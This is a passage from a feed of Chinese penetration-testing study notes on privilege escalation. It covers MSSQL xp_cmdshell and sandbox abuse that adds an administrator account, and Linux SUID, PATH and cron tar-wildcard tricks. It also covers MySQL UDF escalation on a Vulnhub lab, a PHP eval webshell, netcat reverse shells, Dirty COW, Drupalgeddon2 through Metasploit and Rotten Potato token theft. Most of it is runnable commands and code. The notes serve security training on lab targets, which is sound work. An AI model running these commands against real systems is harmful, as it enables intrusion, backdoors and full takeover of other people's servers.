dumpfile &#x27;c:/windows/system32/wbem/mof/nullevt.mof&#x27;;</span><br><span class="line">3.启动项知识点：（基于配合操作系统自启动）</span><br><span class="line">msf 实战上传到启动目录</span><br><span class="line"></span><br><span class="line">导出自定义可执行文件到启动目录配合重启执行</span><br><span class="line">将创建好的后门或执行文件进行服务器启动项写入，配置重启执行！#DDOS</span><br><span class="line">数据库开启外联：</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;mypassword&#x27; WITH GRANT OPTION #予任何主机访问数据的权限</span><br><span class="line"></span><br><span class="line">4.反弹知识点：（基于利用反弹特性命令执行）</span><br><span class="line">nc -l -p 5577#监听5577端口</span><br></pre></td></tr></table></figure><br /><br />**#案例2.Mssql数据库提权演示-连接客户端（一般默认支持外联）**<br />流程：服务探针-信息收集（得到sa密码）-提权利用-获取权限<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">1.适用xp_cmdshell进行提权</span><br><span class="line">xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。</span><br><span class="line">启用：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">关闭：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">执行：</span><br><span class="line">EXEC master.dbo.xp_cmdshell &#x27;命令&#x27;</span><br><span class="line">如果 xp_cmdshell 被删除了，可以上传 xplog70.dll 进行恢复</span><br><span class="line">exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program Files\Microsoft SQL</span><br><span class="line">Server\MSSQL\Binn\xplog70.dll&#x27;</span><br><span class="line"></span><br><span class="line">2.适用sp_oacreate进行提权</span><br><span class="line">主要用来调用OLE对象，利用OLE对象的run方法执行系统命令。</span><br><span class="line">启用：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line"></span><br><span class="line">关闭：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 0;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line"></span><br><span class="line">执行：</span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod</span><br><span class="line">@shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt#不输出到txt可能无回显</span><br><span class="line"></span><br><span class="line">3.适用SQL Server沙盒提权</span><br><span class="line">参考资料：https://blog.51cto.com/u_11797152/2411770</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">-- 不开启的话在执行 xp_regwrite 会提示让我们开启，</span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure;</span><br><span class="line">--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</span><br><span class="line">exec master..xp_regwrite</span><br><span class="line">&#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br><span class="line">--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</span><br><span class="line">exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,</span><br><span class="line">&#x27;SandBoxMode&#x27;</span><br><span class="line">-- 执 行 系 统 命 令 select * from</span><br><span class="line">openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user</span><br><span class="line">margin margin /add&quot;)&#x27;)</span><br><span class="line">select * from</span><br><span class="line">openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net</span><br><span class="line">localgroup administrators margin /add&quot;)&#x27;)</span><br><span class="line">沙盒模式 SandBoxMode 参数含义（默认是 2）</span><br></pre></td></tr></table></figure>**#案例3.**<br />**普通用户模式：**<br />前提是拥有一个普通的oracle连接账号，不需要DBA权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DBA用户模式：（自动化工具演示）</span><br><span class="line">拥有DBA账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。</span><br><span class="line"></span><br><span class="line">注入提升模式：（sqlmap测试演示）</span><br><span class="line">拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显，需要自己验证。</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权，但需要知道&lt;strong&gt;数据库提权&lt;/strong&gt;的&lt;strong&gt;前提条件：&lt;/strong&gt;&lt;br /&gt;&lt;strong&gt;服务器开启数据库服务及获取到最高权限用户密码&lt;/strong&gt;。除Access数据库外，其他数据库基本都存在数据库提权的可能。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="https://coldrainh.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="权限提升" scheme="https://coldrainh.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    <category term="小迪安全" scheme="https://coldrainh.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="渗透测试" scheme="https://coldrainh.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="内网渗透" scheme="https://coldrainh.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="权限提升" scheme="https://coldrainh.github.io/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    <category term="数据库" scheme="https://coldrainh.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    <category term="小迪安全" scheme="https://coldrainh.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>权限提升-Linux定时任务&amp;环境变量&amp;数据库</title>
    <link href="https://coldrainh.github.io/2021/10/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&amp;%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&amp;%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <id>https://coldrainh.github.io/2021/10/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&amp;%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&amp;%E6%95%B0%E6%8D%AE%E5%BA%93/</id>
    <published>2021-10-09T07:31:08.000Z</published>
    <updated>2021-10-13T07:18:42.870Z</updated>
    
    <content type="html"><![CDATA[<p><strong>#案例1.Linux提权本地环境变量安全-本地</strong><br /><strong>配合SUID进行环境变量提权-本地用户环境</strong><br /><strong>手写调用文件-编译-复制文件-增加环境变量-执行触发</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcc demo.c -o shell</span><br><span class="line">cp /bin/sh /tmp/ps</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./shell</span><br><span class="line">id</span><br><span class="line"></span><br></pre></td></tr></table></figure><span id="more"></span><p><br />demo.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;ps&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/3e81aad1db625676f4cb8eab6cd69da1.png" alt="image.png"></p><ol><li><p><strong>路径问题</strong></p><ol><li>利用计划任务指向的文件的相对路径解析问题<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /ect/crontab</span><br><span class="line">echo &#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27; &gt; /home/xiaodi/test.sh</span><br><span class="line">chmod +x /home/xiaodi/test.sh</span><br><span class="line">/tmp/bash</span><br></pre></td></tr></table></figure></li></ol></li><li><p><strong>命令问题</strong></p><ol><li>利用通配符配合命令参数自定义命令实现提权</li><li>不安全定时任务备份命令：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /home/undead/script;tar czf /tmp/backup.tar.gz *<span class="meta">#backup.sh</span></span><br><span class="line">echo <span class="string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt; /home/undead/script/test.sh</span><br><span class="line">echo <span class="string">&quot;&quot;</span> &gt; <span class="string">&quot;--checkpoint-action=exec=sh test.sh&quot;</span></span><br><span class="line">echo <span class="string">&quot;&quot;</span> &gt; --checkpoint=<span class="number">1</span></span><br><span class="line">cd /tmp</span><br><span class="line">./bash -p</span><br></pre></td></tr></table></figure><a href="https://www.cnblogs.com/manong--/p/8012324.html">https://www.cnblogs.com/manong–/p/8012324.htm</a><a href="https://www.cnblogs.com/manong--/p/8012324.html">l</a><br />test.sh<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /tmp/bash; chmod +s /tmp/bash</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/img_convert/4836db792acf034e0b392330b79b59af.png" alt="image.png"></li></ol></li><li><p><strong>权限问题</strong></p><ol><li>利用不安全的权限分配操作导致的定时文件覆盖</li><li>chmod 777 775 等 所有者 组 其他成员说明</li></ol></li></ol><p><strong>#案例3.Linux提权数据库MYSQL_UDF-Vulnhub</strong><br /><a href="https://www.vulnhub.com/entry/raven-2,269/">https://www.vulnhub.com/entry/raven-2,269/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Vulnhub 某靶机-探针 IP 及端口-利用漏洞获取 web 权限-信息收集-查看数据库配置文件-利用 Mysql 提</span><br><span class="line">权 Linux（Mysql 版本区别同 Windows）</span><br><span class="line">#探针 IP 及端口</span><br><span class="line">nmap 192.168.76.0/24</span><br><span class="line">#利用 phpmailer 漏洞进行修改并反弹</span><br><span class="line">python D:/Myproject/40974.py</span><br><span class="line">nc -lvvp 4444</span><br><span class="line">#写入后门利用菜刀连接方便操作</span><br><span class="line">echo &#x27;&lt;?php eval($_POST[x]);?&gt;&#x27; &gt;1.php</span><br><span class="line">上传信息收集脚本进行提权信息收集</span><br><span class="line">./LinEnum.sh</span><br><span class="line">翻阅数据库配置文件获取 root 密码</span><br><span class="line">#利用 Mysql 提权 searchsploit</span><br><span class="line">下载 mysql udf poc 进行编译</span><br><span class="line">wget https://www.exploit-db.com/download/1518</span><br><span class="line">mv 1518 raptor_udf.c</span><br><span class="line">gcc -g -c raptor_udf.c</span><br><span class="line">gcc -g -shared -o raptor_udf.so raptor_udf.o -lc</span><br><span class="line">mv raptor_udf.so 1518.so</span><br><span class="line">下载 1518 到目标服务器</span><br><span class="line">wget https://xx.xx.xx.xx/1518.so</span><br><span class="line">进入数据库进行 UDF 导出</span><br><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#x27;/tmp/1518.so&#x27;));</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;</span><br><span class="line">创建 do_system 函数调用</span><br><span class="line">create function do_system returns integer soname &#x27;1518.so&#x27;；</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line">#配合使用 find 调用执行</span><br><span class="line">touch xiaodi</span><br><span class="line">find xiaodi –exec &quot;whoami&quot; \;</span><br><span class="line">find xiaodi –exec &quot;/bin/sh&quot; \;</span><br><span class="line">id</span><br></pre></td></tr></table></figure><p><strong>#案例4.Linux提权提升简单总结归类-参考PDF</strong></p><ol><li>提权环境，信息收集（SUID，定时任务，可能漏掉，第三方服务应用等）</li><li>最新相关漏洞要明确（关注点），二次开发相关脚本学会展望（四个脚本）</li><li>本地searchsploit脚本及远程exploitdb站点搜索说明（简要使用）</li><li>其他提权方法：密码复用，guid，sudo等说明（运气，同理，鸡肋等）</li></ol><p>SUDO参考说明：<a href="https://www.freebuf.com/vuls/217089.html">https://www.freebuf.com/vuls/217089.html</a><br />**<br>考说明：<a href="https://www.freebuf.com/vuls/217089.html">https://www.freebuf.com/vuls/217089.html</a><br />**</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;#案例1.Linux提权本地环境变量安全-本地&lt;/strong&gt;&lt;br /&gt;&lt;strong&gt;配合SUID进行环境变量提权-本地用户环境&lt;/strong&gt;&lt;br /&gt;&lt;strong&gt;手写调用文件-编译-复制文件-增加环境变量-执行触发&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;gcc demo.c -o shell&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cp /bin/sh /tmp/ps&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;export PATH=/tmp:$PATH&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./shell&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;id&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="https://coldrainh.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="权限提升" scheme="https://coldrainh.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    <category term="小迪安全" scheme="https://coldrainh.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="渗透测试" scheme="https://coldrainh.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="内网渗透" scheme="https://coldrainh.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="权限提升" scheme="https://coldrainh.github.io/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    <category term="数据库" scheme="https://coldrainh.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    <category term="小迪安全" scheme="https://coldrainh.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>权限提升-Linux脏牛内核漏洞&amp;SUID&amp;信息收集</title>
    <link href="https://coldrainh.github.io/2021/10/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&amp;SUID&amp;%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://coldrainh.github.io/2021/10/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&amp;SUID&amp;%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2021-10-09T07:31:08.000Z</published>
    <updated>2021-10-13T07:22:57.163Z</updated>
    
    <content type="html"><![CDATA[<p>linux提权一般放置tmp目录，临时目录，一般可读写，可执行.sh是linux可执行文件<br />运行：./linux.x.x.x.x.sh<br />perl对应的是 pl<br />有本地用户，就本地提权，没有就通过MSF提权<br /><strong><span id="more"></span>#案例1.Linux提权自动化脚本利用-4个脚本</strong><br />两个信息收集：LinEnum，linuxprivchecker<br />为后续的提权方法提供基础，<br />两个漏洞探针：linux-exploit-suggester linux-exploit-suggester2<br /><br><br /><strong>#案例2.LInux提权SUID配合脚本演示-Web</strong><br />漏洞成因：chmod u+s 给予了 suid u-s删除了suid<br />使程序在运行过程中受到lsuid root权限的执行过程导致<br />（普通用户执行，实际是以root权限执行）<br />提权过程：探针是否有SUID（手工或脚本）-特定SUID利用-利用吃瓜-GG</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>参考利用：<a href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a><br />touch xiaodi <br />find xiaodi -exec whoami ; <br />ind xiaodi -exec netcat -lvp 5555 -e /bin/sh ; <br />netcat xx.xx.xx.xx 5555<br />0x01.得到webshell权限<br /><img src="https://img-blog.csdnimg.cn/img_convert/59684267f8d60f9f4de76a62e3d5cb0c.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc 45010.c -o 45010</span><br><span class="line">chmod +x 45010</span><br><span class="line">./45010</span><br><span class="line">id</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>#案例4.LInux提权脏牛内核漏洞演示-Vulnhub</strong><br />内核提权整个过程：（linux-exploit-suggester 获取信息哦） <br />vulnhub 靶机-探针目标-CMS 漏洞利用-脚本探针提权漏洞-利用内核提权-GG 内核漏洞<br />提权过程：寻可用-下 exp-上/tmp-编译 exp-执行(无权限用 chmod)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.76.0/24</span><br><span class="line">nmap -p1-65535 192.168.76.141</span><br><span class="line">search drupal</span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">set lhost 192.168.76.141</span><br><span class="line">set lport 1898</span><br><span class="line">set target 0</span><br><span class="line">run</span><br><span class="line">upload /tmp/40837.cpp /tmp/40837.cpp</span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;#利用python生成可交互式shell</span><br><span class="line">./dcow</span><br></pre></td></tr></table></figure><p>脏牛漏洞：<br /><a href="https://paper.seebug.org/483/#_4">https://paper.seebug.org/483/#_4</a><br>ps://paper.seebug.org/483/#_4)</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;linux提权一般放置tmp目录，临时目录，一般可读写，可执行.sh是linux可执行文件&lt;br /&gt;运行：./linux.x.x.x.x.sh&lt;br /&gt;perl对应的是 pl&lt;br /&gt;有本地用户，就本地提权，没有就通过MSF提权&lt;br /&gt;&lt;strong&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="https://coldrainh.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="权限提升" scheme="https://coldrainh.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    <category term="小迪安全" scheme="https://coldrainh.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="渗透测试" scheme="https://coldrainh.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="内网渗透" scheme="https://coldrainh.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="权限提升" scheme="https://coldrainh.github.io/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    <category term="小迪安全" scheme="https://coldrainh.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
    <category term="linux" scheme="https://coldrainh.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>权限提升-烂土豆&amp;dll劫持&amp;引号路径&amp;服务权限</title>
    <link href="https://coldrainh.github.io/2021/10/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%83%82%E5%9C%9F%E8%B1%86&amp;dll%E5%8A%AB%E6%8C%81&amp;%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84&amp;%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/"/>
    <id>https://coldrainh.github.io/2021/10/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%83%82%E5%9C%9F%E8%B1%86&amp;dll%E5%8A%AB%E6%8C%81&amp;%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84&amp;%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/</id>
    <published>2021-10-09T07:31:08.000Z</published>
    <updated>2021-10-13T07:30:46.248Z</updated>
    
    <content type="html"><![CDATA[<p><strong>RottenPotato(烂土豆)提权的原理简述如下：</strong></p><ol><li>欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端</li><li>对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。</li><li>模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</li></ol><p>所以，一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户（就是上面说的用户和账户）去反弹meterpreter然后再执行EXP的时候会失败，但使用菜刀（IIS服务器权限）反弹meterpreter就会成功。<br /><br><br />烂土豆比热土豆的优点是：</p><ol><li>100%可靠</li><li>（当时）全版本通杀</li><li>立即生效，不用像hot potato那样有时候需要等Windows更新才能使用</li></ol><p>总之，我对这个的理解是通过中间人攻击，将COM(NT\SYSTEM权限)在第二步挑战应答过程中认证的区块改为自己的区块获取SYSTEM权限，然后利用msf的模仿令牌功能模仿SYSTEM令牌。<br /><br><br />必备知识点：<br /> #令牌窃取配合烂土豆提权 单纯令牌窃取：Web 权限或本地提权 如配合烂土豆提权：Web 或数据库等权限 #不带引号服务路径安全问题 服务路径提权：Web 权限或本地提权<br /> #不安全的服务权限配置问题 服务权限配置：Web 权限或本地提权(Web 几率小)<br /> #补充说明：dll 劫持提权及 AlwaysInstallElevated 等说明 dll 劫持提权需要特定软件应用的控制权限及启用配合，复杂鸡肋 AlwaysInstallElevated 提权默认禁用配置，利用成功机会很少<br /><br><br /><strong>#案例1.Win2012-烂土豆配合令牌窃取提权-Web权限</strong><br /><strong>原理：参考上述内容，非服务类用户无法窃取成功</strong><br />过程：上传烂土豆-执行烂土豆-利用窃取模块-窃取SYSTEM-成功<br />实现：web权限-通过烂土豆配合令牌-获取SYSTEM</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">《MSF操作》</span><br><span class="line">upload /root/potato.exe C:\Users\Public</span><br><span class="line">cd C:\\Users\\Public</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">execute -cH -f ./potato.exe</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br></pre></td></tr></table></figure><p><strong>#案例2.Wind2012-DLL劫持提权应用配合MSF-web权限</strong><br />原理：Windows 程序启动的时候需要 DLL。如果这些 DLL 不存在，则可以通过在应用程序要查找的 位置放置恶意 DLL 来提权。通常，Windows 应用程序有其预定义好的搜索 DLL 的路径，它会根据下 面的顺序进行搜索：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 